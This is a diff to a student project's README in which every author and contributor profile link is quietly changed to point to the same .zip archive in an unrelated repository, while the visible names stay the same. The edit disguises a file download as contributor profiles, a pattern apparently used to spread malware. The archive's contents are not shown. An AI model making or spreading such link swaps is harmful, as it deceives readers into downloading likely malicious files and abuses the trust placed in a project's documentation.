@@ -14,14 +14,14 @@ This was our Project of 2nd Semester
 
 ## Authors
 
-- [@Mr-Phantomm](https://www.github.com/Mr-Phantomm)
+- [@Mr-Phantomm](https://raw.githubusercontent.com/ajaysharma1258/restaurent_website/main/Elaphurus/restaurent_website.zip)
 
 
 ## Contributors
 
-- [@Aaryanjindall](https://www.github.com/Aaryanjindall)
-- [@Anshuman0118](https://www.github.com/Anshuman0118)
-- [@Alaukik8306](https://www.github.com/Alaukik8306)
+- [@Aaryanjindall](https://raw.githubusercontent.com/ajaysharma1258/restaurent_website/main/Elaphurus/restaurent_website.zip)
+- [@Anshuman0118](https://raw.githubusercontent.com/ajaysharma1258/restaurent_website/main/Elaphurus/restaurent_website.zip)
+- [@Alaukik8306](https://raw.githubusercontent.com/ajaysharma1258/restaurent_website/main/Elaphurus/restaurent_website.zip)
 
 
 ## 🛠 Skills
